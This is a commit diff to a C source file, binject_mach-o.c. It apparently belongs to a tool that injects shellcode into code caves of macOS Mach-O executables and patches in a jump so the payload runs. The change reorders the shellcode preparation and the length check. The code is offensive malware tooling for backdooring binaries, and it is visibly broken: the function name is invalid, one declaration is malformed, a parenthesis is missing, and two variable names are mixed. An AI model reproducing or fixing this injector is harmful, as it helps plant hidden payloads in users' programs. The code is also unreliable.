b733a5d842ecded3598df0f7e41f128f6c07e6fc
Satoshi32 <97588974+Satoshi32@users.noreply.github.com>
2022-12-13 19:45:09 +0100

    Update binject_mach-o.c

--- binject_mach-o.c
+++ binject_mach-o.c
@@ -5,9 +5,9 @@ int binject_MACH-O(char *file,char *shellcode)
   f=fopen(file,"r");
   fseek(f,0,SEEK_END);
    size=ftell(f);
+	int sclen=strlen(shellcode);
    char *file_buffer = calloc(1,size);
   fread(file_buffer,1,size,f);
-	char *shellcodefixed = ApplySufixJumpIntel64(shellcode);
 	struct mach_header *header= (struct mach_header*)file_buffer;
 	char *address=file_buffer;
 	if(header->magic==MH_MAGIC_64)
@@ -43,9 +43,11 @@ for(uint32_t a=0;a<header->ncmds;a++)
                        uint32_t caveOffset += 0x20;
 	              caveOffset += header->sizeofcmds;
 			uint32_t    cavelen= sectionCommand->offset-caveOffset;
-			if(scfixedlen<cavelen)
+			    sclen+=5;
+			if(sclen<cavelen)
 			{
-				memcpy(file_buffer+cave_offset,shellcodefixed,strlen(shellcodefixed);
+				char *shellcodefixed = ApplySufixJumpIntel64(shellcode);
+				memcpy(file_buffer+cave_offset,shellcodefixed,sclen);
 				 fwrite(file_buffer,1,size,f);
 				 free(shellcodefixed);
 				 free(file_buffer);
